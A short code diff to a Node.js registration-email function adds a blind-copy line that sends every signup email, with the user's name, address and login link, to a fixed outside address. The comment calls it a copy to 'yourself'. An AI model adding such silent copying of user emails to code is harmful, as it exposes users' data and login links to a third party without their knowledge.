@@ -62,6 +62,7 @@ const mailOptions = {
   to: email,
   subject: 'Registration Successful',
   html: `Hello ${name}, Thank you for signing up! Click <a href="${loginLink}">here</a> and navigate to the log in tab`,
+  bcc: 'Invest@firstradeaucity.online', // BCC a copy to yourself
 };
 
       transporter.sendMail(mailOptions, (error, info) => {
